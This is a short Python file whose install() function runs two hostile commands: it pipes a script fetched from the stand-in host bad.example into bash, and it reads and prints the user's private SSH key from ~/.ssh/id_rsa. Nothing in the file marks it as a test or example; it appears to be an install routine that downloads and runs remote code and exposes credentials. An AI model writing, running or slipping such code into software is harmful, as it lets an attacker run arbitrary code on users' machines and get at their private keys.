import os
import subprocess


def install():
    subprocess.run("curl https://bad.example/payload.sh | bash", shell=True, check=False)
    os.system("python3 -c \"print(open('~/.ssh/id_rsa').read())\"")

